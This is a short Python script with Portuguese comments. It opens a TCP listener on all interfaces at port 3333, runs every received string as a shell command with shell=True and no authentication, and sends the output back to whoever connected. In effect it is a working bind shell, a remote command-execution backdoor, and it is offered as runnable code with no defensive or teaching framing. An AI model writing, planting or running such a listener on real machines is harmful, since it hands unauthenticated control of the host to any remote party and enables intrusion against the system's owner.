import socket
import subprocess

def iniciar_ouvinte():
    HOST = '0.0.0.0' 
    PORT = 3333

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # Permite reutilizar a porta imediatamente após fechar o script
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen(1)
        print(f"Aguardando conexão em {PORT}...")

        while True:
            conn, addr = s.accept()
            with conn:
                print(f"Conectado por: {addr}")
                dados = conn.recv(1024)
                if not dados:
                    continue
                
                comando = dados.decode('utf-8').strip()
                print(f"Executando: {comando}")
                
                try:
                    # Executa o comando e captura a saída e erros
                    resultado = subprocess.check_output(
                        comando, 
                        shell=True, 
                        stderr=subprocess.STDOUT,
                        universal_newlines=False # Mantém em bytes para envio direto
                    )
                    #print(resultado)

                    if not resultado:
                        resultado = b"Comando executado (sem saida de texto)."
                        
                except subprocess.CalledProcessError as e:
                    # Se o comando falhar, captura a mensagem de erro
                    resultado = f"Erro ao executar: {e.output.decode('utf-8')}".encode('utf-8')
                except Exception as e:
                    resultado = f"Erro inesperado: {str(e)}".encode('utf-8')

                # Envia o resultado de volta para o IP que se conectou
                conn.sendall(resultado)

if __name__ == "__main__":
    iniciar_ouvinte()